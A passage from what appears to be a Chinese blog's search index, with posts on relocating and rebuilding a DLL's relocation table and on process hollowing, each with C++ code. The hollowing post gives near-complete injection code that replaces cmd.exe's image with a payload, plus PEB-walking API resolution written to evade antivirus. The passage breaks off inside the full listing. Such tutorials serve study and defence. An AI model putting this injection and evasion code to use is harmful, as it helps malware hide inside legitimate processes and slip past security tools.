API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"移动重定位表","slug":"移动重定位表","date":"2024-07-02T07:15:23.000Z","updated":"2024-07-05T11:09:52.698Z","comments":true,"path":"5e9312f.html","link":"","permalink":"http://example.com/5e9312f.html","excerpt":"移动重定位表Relocation（重定位）是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中，由于程序中使用了各种全局变量和函数，这些变量和函数的地址还没有确定，因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时，这些相对地址需要被修正为实际的绝对地址，这个过程就是重定位;在Windows操作系统中，程序被加载到内存中运行时，需要将程序中的各种内存地址进行重定位，以使程序能够正确地运行。Windows系统使用PE（Portable Executable）文件格式来存储可执行程序，其中包括重定位信息。当程序被加载到内存中时，系统会解析这些重定位信息，并将程序中的各种内存地址进行重定位;重定位表一般出现在DLL中，因为DLL都是动态加载，所以地址不固定，DLL的入口点在整个执行过程中至少要执行2次，一次是在开始时执行初始化工作，一次则是在结束时做最后的收尾工作，重定位表则是解决DLL的地址问题;","text":"移动重定位表Relocation（重定位）是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中，由于程序中使用了各种全局变量和函数，这些变量和函数的地址还没有确定，因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时，这些相对地址需要被修正为实际的绝对地址，这个过程就是重定位;在Windows操作系统中，程序被加载到内存中运行时，需要将程序中的各种内存地址进行重定位，以使程序能够正确地运行。Windows系统使用PE（Portable Executable）文件格式来存储可执行程序，其中包括重定位信息。当程序被加载到内存中时，系统会解析这些重定位信息，并将程序中的各种内存地址进行重定位;重定位表一般出现在DLL中，因为DLL都是动态加载，所以地址不固定，DLL的入口点在整个执行过程中至少要执行2次，一次是在开始时执行初始化工作，一次则是在结束时做最后的收尾工作，重定位表则是解决DLL的地址问题; 移动重定位表步骤读取文件并在FileBuffer中新增一个节(.rbase);设置节表信息并修正PE头;解析重定位表、复制重定位表、修正数据目录;将数据写入新的文件;验证是否移动成功; ROA转FOA 将ROA转换成FOA 12345678910111213141516171819DWORD RVA2FOA(DWORD dwRVA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBuffer); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if(dwRVA &lt; pSec[0].VirtualAddress) &#123; return dwRVA; &#125; for(size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize) &#123; return dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; FOA转RVA 将FOA转化成RVA 12345678910111213141516171819DWORD FOA2RVA(DWORD dwFOA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if (dwFOA &lt; pSec[0].PointerToRawData) &#123; return dwFOA; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if (dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; pSec[i].PointerToRawData + pSec[i].SizeOfRawData) &#123; return pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData; &#125; &#125; return dwFOA;&#125; 移动重定位表具体步骤 读取Dll文件至内存中 123456789101112131415161718192021222324252627282930// 读取文件HANDLE hFile = CreateFileA( FilePath_SRC, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if (INVALID_HANDLE_VALUE == hFile)&#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);printf(&quot;dwFileSize: %d\\n&quot;, dwFileSize);LPVOID lpData = new BYTE[dwFileSize];if (lpData == NULL)&#123; printf(&quot;申请内存失败\\n&quot;); return 0;&#125;DWORD dwRead = 0;if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 0;&#125;printf(&quot;lpData: %x\\n&quot;, *(short*)lpData); 新增节表 新增.rbase节表 1234567891011121314151617181920212223242526// 解析PE文件PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData;PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData);PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);//printf(&quot;pDos: %x\\n&quot;, pDos-&gt;e_magic);// 新增节表PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;if (((DWORD)lpData + dwFileSize - (DWORD)pNewSec) &lt; 80)&#123; printf(&quot;空间不足新增节表\\n&quot;); return 0;&#125;// 设置节表信息strcpy((char*)pNewSec-&gt;Name, &quot;.rbase&quot;);pNewSec-&gt;Misc.VirtualSize = 0x7000;pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;pNewSec-&gt;SizeOfRawData = 0x7000;PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - 1);pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;pNewSec-&gt;Characteristics = pSec[0].Characteristics;// 修正PE头pNt-&gt;FileHeader.NumberOfSections += 1;pNt-&gt;OptionalHeader.SizeOfImage += 0x7000; 复制重定位表 123456789101112131415161718LPVOID lpSecMemory = new BYTE[0x7000];if (lpSecMemory == NULL)&#123; printf(&quot;新节表申请内存失败\\n&quot;); return 0;&#125;memset(lpSecMemory, 0, 0x7000);// 解析重定位表PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(RVA2FOA(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);printf(&quot;pDir-&gt;Size: %x\\n&quot;, pDir-&gt;Size);// 复制重定位表 memcpy(lpSecMemory, pReloc, pDir-&gt;Size);// 修正数据目录pDir-&gt;VirtualAddress = FOA2RVA(dwFileSize, lpData); 将数据写入新文件 1234567891011121314151617181920212223// 打开新文件HANDLE hNewFile = CreateFileA(FilePath_DEST, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);if (INVALID_HANDLE_VALUE == hNewFile)&#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0;&#125;// 写出第一部分DWORD lpNumberOfBytesWritten1 = 0;if (FALSE == WriteFile(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten1, NULL))&#123; printf(&quot;WriteFile One Failed\\n&quot;); return 0;&#125;// 写出新节DWORD lpNumberOfBytesWritten2 = 0;if (FALSE == WriteFile(hNewFile, lpSecMemory, 0x7000, &amp;lpNumberOfBytesWritten2, NULL))&#123; printf(&quot;WriteFile Two Failed\\n&quot;); return 0;&#125;CloseHandle(hNewFile);printf(&quot;WriteFile Success: %d %d\\n&quot;, lpNumberOfBytesWritten1, lpNumberOfBytesWritten2); 调用新的Dll文件 123456789typedef void (*MyShowMessage)();HMODULE hDll = LoadLibraryA(FilePath_DEST);if (hDll == NULL)&#123; printf(&quot;LoadLibraryA Failed\\n&quot;); return 0;&#125;MyShowMessage myShowMessage = (MyShowMessage)GetProcAddress(hDll, &quot;ShowMessage&quot;);myShowMessage(); 运行成功 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#include &lt;iostream&gt;#include &lt;Windows.h&gt;constexpr auto FilePath_SRC = &quot;xxx\\\\Dll1.dll&quot;;constexpr auto FilePath_DEST = &quot;xxx\\\\Dll1_demo.dll&quot;;DWORD RVA2FOA(DWORD dwRVA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if (dwRVA &lt; pSec[0].VirtualAddress) &#123; return dwRVA; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize) &#123; return dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData; &#125; &#125; return dwRVA;&#125;DWORD FOA2RVA(DWORD dwFOA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if (dwFOA &lt; pSec[0].PointerToRawData) &#123; return dwFOA; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if (dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; pSec[i].PointerToRawData + pSec[i].SizeOfRawData) &#123; return pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData; &#125; &#125; return dwFOA;&#125;int main()&#123; // 读取文件 HANDLE hFile = CreateFileA( FilePath_SRC, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL ); if (INVALID_HANDLE_VALUE == hFile) &#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;dwFileSize: %d\\n&quot;, dwFileSize); LPVOID lpData = new BYTE[dwFileSize]; if (lpData == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return 0; &#125; DWORD dwRead = 0; if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL)) &#123; printf(&quot;ReadFile Failed\\n&quot;); return 0; &#125; printf(&quot;lpData: %x\\n&quot;, *(short*)lpData); // 解析PE文件 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); //printf(&quot;pDos: %x\\n&quot;, pDos-&gt;e_magic); // 新增节表 PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections; if (((DWORD)lpData + dwFileSize - (DWORD)pNewSec) &lt; 80) &#123; printf(&quot;空间不足新增节表\\n&quot;); return 0; &#125; // 设置节表信息 strcpy((char*)pNewSec-&gt;Name, &quot;.rbase&quot;); pNewSec-&gt;Misc.VirtualSize = 0x7000; pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage; pNewSec-&gt;SizeOfRawData = 0x7000; PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - 1); pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData; pNewSec-&gt;Characteristics = pSec[0].Characteristics; // 修正PE头 pNt-&gt;FileHeader.NumberOfSections += 1; pNt-&gt;OptionalHeader.SizeOfImage += 0x7000; LPVOID lpSecMemory = new BYTE[0x7000]; if (lpSecMemory == NULL) &#123; printf(&quot;新节表申请内存失败\\n&quot;); return 0; &#125; memset(lpSecMemory, 0, 0x7000); // 解析重定位表 PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(RVA2FOA(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData); printf(&quot;pDir-&gt;Size: %x\\n&quot;, pDir-&gt;Size); // 复制重定位表 memcpy(lpSecMemory, pReloc, pDir-&gt;Size); // 修正数据目录 pDir-&gt;VirtualAddress = FOA2RVA(dwFileSize, lpData); // 打开新文件 HANDLE hNewFile = CreateFileA(FilePath_DEST, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hNewFile) &#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0; &#125; // 写出第一部分 DWORD lpNumberOfBytesWritten1 = 0; if (FALSE == WriteFile(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten1, NULL)) &#123; printf(&quot;WriteFile One Failed\\n&quot;); return 0; &#125; // 写出新节 DWORD lpNumberOfBytesWritten2 = 0; if (FALSE == WriteFile(hNewFile, lpSecMemory, 0x7000, &amp;lpNumberOfBytesWritten2, NULL)) &#123; printf(&quot;WriteFile Two Failed\\n&quot;); return 0; &#125; CloseHandle(hNewFile); printf(&quot;WriteFile Success: %d %d\\n&quot;, lpNumberOfBytesWritten1, lpNumberOfBytesWritten2); typedef void (*MyShowMessage)(); HMODULE hDll = LoadLibraryA(FilePath_DEST); if (hDll == NULL) &#123; printf(&quot;LoadLibraryA Failed\\n&quot;); return 0; &#125; MyShowMessage myShowMessage = (MyShowMessage)GetProcAddress(hDll, &quot;ShowMessage&quot;); myShowMessage();&#125; 重建重定位结构重定位表的修复原理与IAT修复完全一致，我们需要分别读入脱壳前与脱壳后的两个程序，接着通过循环正确的重定位表信息，并依次覆盖到脱壳后的程序内，以此实现对重定位表的修复功能; 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132//Modify_ImageBase_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。////#include &lt;iostream&gt;#include &lt;windows.h&gt;const auto FilePath_SRC = &quot;xxx\\\\Dll1.dll&quot;;const auto FilePath_DEST = &quot;xxx\\\\Dll1_Demo.dll&quot;;DWORD RVA2FOA(DWORD dwRVA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if (dwRVA &lt; pSec[0].VirtualAddress) &#123; return dwRVA; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize) &#123; return dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData; &#125; &#125; return dwRVA;&#125;int main()&#123; HANDLE hFile = CreateFileA( (LPSTR)FilePath_SRC, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile Failed\\n&quot;); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;dwFileSize: %d\\n&quot;, dwFileSize); LPVOID lpData = new BYTE[dwFileSize]; if (NULL == lpData) &#123; printf(&quot;申请内存失败\\n&quot;); return 0; &#125; DWORD lpNumberOfBytesRead = 0; if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;lpNumberOfBytesRead, NULL)) &#123; printf(&quot;ReadFile Failed\\n&quot;); return 0; &#125; CloseHandle(hFile); printf(&quot;lpData: %x\\n&quot;, *(short*)lpData); //解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData); //定位重定位位置 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); //获取重定位表 PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(RVA2FOA(pDataDir-&gt;VirtualAddress, lpData) + (DWORD)lpData); //判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址 if ((LPVOID)pLoc == lpData) &#123; return FALSE; &#125; //循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束 while ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != 0) &#123; //重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后 PWORD pLocData = (PWORD)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION)); //计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA） //SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去 DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (size_t i = 0; i &lt; dwNumOfpLoc; i++) &#123; //高位为3表示有效重定位 if ((DWORD)(pLocData[i] &amp; 0x0000F000) == 0x00003000) &#123; /*需要修正的数据 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移 = 基址 + 重定位地址 + 重定位数据（数据后12位）*/ PDWORD pAddress = (PDWORD)((PBYTE)pDos + RVA2FOA(pLoc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF), lpData)); //重定位地址 = 硬编码地址 - ImageBase + 实际基地址 // = 实际基地址 - ImageBase + 硬编码地址 *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + 0x1500000; &#125; &#125; //循环下一个重定位区段 pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock); &#125; //修改ImageBase pNt-&gt;OptionalHeader.ImageBase = 0x1500000; // 打开新文件 HANDLE hNewFile = CreateFileA(FilePath_DEST, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hNewFile) &#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0; &#125; DWORD lpNumberOfBytesWritten = 0; if (FALSE == WriteFile(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten, NULL)) &#123; printf(&quot;WriteFile Failed\\n&quot;); return 0; &#125; CloseHandle(hNewFile); printf(&quot;WriteFile Success\\n&quot;); typedef void (*MyShowMessage)(); HMODULE hDll = LoadLibraryA(FilePath_DEST); if (hDll == NULL) &#123; printf(&quot;LoadLibraryA Failed\\n&quot;); return 0; &#125; MyShowMessage myShowMessage = (MyShowMessage)GetProcAddress(hDll, &quot;ShowMessage&quot;); myShowMessage(); return 0;&#125; 运行成功","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"ShellCode加载器","slug":"ShellCode加载器","date":"2024-06-27T14:56:45.000Z","updated":"2024-06-27T14:57:58.557Z","comments":true,"path":"3cf1e5d0.html","link":"","permalink":"http://example.com/3cf1e5d0.html","excerpt":"ShellCode加载器","text":"ShellCode加载器","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"进程镂空(傀儡进程)","slug":"进程镂空-傀儡进程","date":"2024-06-27T12:23:25.000Z","updated":"2024-06-27T15:30:17.529Z","comments":true,"path":"efa87f6d.html","link":"","permalink":"http://example.com/efa87f6d.html","excerpt":"进程镂空(傀儡进程)进程镂空(Process Hollowing), 又称傀儡进程, 是一种恶意软件(malware)利用的代码注入技术。它主要用于恶意代码注入到合法进程中, 以规避安全检测、提高恶意代码执行的隐蔽性和稳定性;","text":"进程镂空(傀儡进程)进程镂空(Process Hollowing), 又称傀儡进程, 是一种恶意软件(malware)利用的代码注入技术。它主要用于恶意代码注入到合法进程中, 以规避安全检测、提高恶意代码执行的隐蔽性和稳定性; x32位实现思路创建挂起进程 以挂起的形式创建一个新的目标进程(以cmd.exe为例), 使用CreatePorcessA函数时需设置dwCreationFlags为CREATE_SUSPENDED; 1234567891011121314151617181920STARTUPINFOA lpStartupInfo = &#123;&#125;;lpStartupInfo.cb = sizeof(STARTUPINFOA);PROCESS_INFORMATION pi = &#123;&#125;;// 以挂起的形式启动一个进程if (FALSE == CreateProcessA( NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;lpStartupInfo, &amp;pi))&#123; printf(&quot;CreateFile Failed\\n&quot;); return -1;&#125; 将恶意程序加载到内存123456789101112131415HANDLE hFile = CreateFile(szTARGETFILE, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);if (hFile == NULL)&#123; printf(&quot;CreateFile Failed.\\n&quot;); return -1;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);DWORD dwReadLenth = 0;if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, NULL))&#123; printf(&quot;ReadFile Failed,\\n&quot;); return -1;&#125;CloseHandle(hFile); 获取挂起进程上下文以及映像基址 通过ctx.Ebx+8可以获取傀儡进程的ImageBase地址，因为ctx.Ebx包含PEB地址，而PEB的ImageBaseAddress字段位于PEB的偏移量0x8处 1234567// 获取上下文CONTEXT ctx = &#123;&#125;;ctx.ContextFlags = CONTEXT_ALL;GetThreadContext(pi.hThread, &amp;ctx);LPVOID lpImageBase = NULL;ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &amp;lpImageBase, sizeof(PVOID), NULL); // ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase 卸载挂起进程内存12345678910if ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase)&#123; FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if (NtUnmapViewOfSection == NULL) &#123; printf(&quot;NtUnmapViewOfSection GetProcAddress Failed.\\n&quot;); return -1; &#125; NtUnmapViewOfSection(pi.hProcess, lpImageBase);&#125; 将恶意程序内容写入目标进程 申请可读可写可执行内存, 将恶意程序头部写入内存, 然后循环将区段写入; 12345678910111213141516LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if (lpTargetMemory == NULL)&#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1;&#125;if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL))&#123; printf(&quot;WritePrcessMemory PE Header Failed.\\n&quot;); return -1;&#125;for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)&#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)); WriteProcessMemory(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL);&#125; 更新目标进程的线程上下文 将EntryPoint地址写入ctx.Eax是为了让目标进程在恢复执行时，从特定的地址（EntryPoint）开始运行; ctx.Ebx + sizeof(DWORD) * 2相当于ctx.Ebx + 0x8; 同样是将新的ImageBase写入到PEB偏移0x8处, 也就是ImageBaseAddress字段; 12ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint);WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + sizeof(DWORD) * 2), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(LPVOID), NULL); 恢复目标进程主线程 使用动态获取SetThreadContext函数并调用, 规避一下杀软; 恢复主线程并关闭句柄; 123456789101112//SetThreadContext(pi.hThread, &amp;ctx);MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall();if (mySetThreadContext == NULL)&#123; printf(&quot;DynamicCall Failed\\n&quot;); return 0;&#125;mySetThreadContext(pi.hThread, &amp;ctx);ResumeThread(pi.hThread);CloseHandle(pi.hProcess);CloseHandle(pi.hThread); x32位完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169// 傀儡进程/进程镂空// 1. 以挂起的模式启动一个进程（计算器，cmd，notepad）合法程序// 2. 把真正要执行的代码读入// 3. 获取挂起进程相关信息// 4. 把挂起进程的内存掏空// 5. 把要执行的代码写入掏空的进程// 6. 恢复执行#include &lt;iostream&gt;#include &lt;windows.h&gt;const wchar_t* szTARGETFILE = L&quot;D:\\\\test.exe&quot;;typedef NTSTATUS(WINAPI* FnNtUnmapViewOfSection)(HANDLE, PVOID);typedef BOOL (WINAPI* MySetThreadContext)(_In_ HANDLE hThread,_In_ CONST CONTEXT* lpContext);// 动态获取SetThreadContext的地址DWORD DynamicCall() &#123; // 1. 获取Kernel32的基址 DWORD dwKernel32 = 0; // TEB结构体 _TEB* pTeb = NtCurrentTeb(); // PEB结构体 PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); // LDR结构体 PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); // 进程所有模块 PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); // 主模块 PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; // NtDll PDWORD pModNtDll = (PDWORD)*pModExe; // Kernel32Dll PDWORD pModKernel32 = (PDWORD)*pModNtDll; // 基址 dwKernel32 = pModKernel32[6]; printf(&quot;Kernel32 Base: %08x %S\\n&quot;, dwKernel32, (const char*)pModKernel32[12]); // 解析PE文件 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwKernel32; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos); PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos); PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos); PWORD pAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; //DWORD dwGetProcAddress = 0; DWORD dwSetThreadContext = 0; for (size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD)pDos); char szSetThreadAddress[] = &#123; &#x27;S&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;x&#x27;, &#x27;t&#x27;,&#x27;\\0&#x27;&#125;; int nFlags = 0; for (size_t j = 0; j &lt; 16; j++) &#123; if (szFuncName[j] == szSetThreadAddress[j]) &#123; nFlags++; &#125; if (nFlags == 16) &#123; dwSetThreadContext = (DWORD)(pwAddressOfFunctions[pAddressOfNameOrdinals[i]] + (DWORD)pDos); break; &#125; &#125; &#125; // 不能打印SetThreadContext地址, 会触发HR报毒 //printf(&quot;dwSetThreadContext: %08x\\n&quot;, dwSetThreadContext); if (dwSetThreadContext == NULL) &#123; return 0; &#125; return dwSetThreadContext;&#125;int main()&#123; STARTUPINFOA lpStartupInfo = &#123;&#125;; lpStartupInfo.cb = sizeof(STARTUPINFOA); 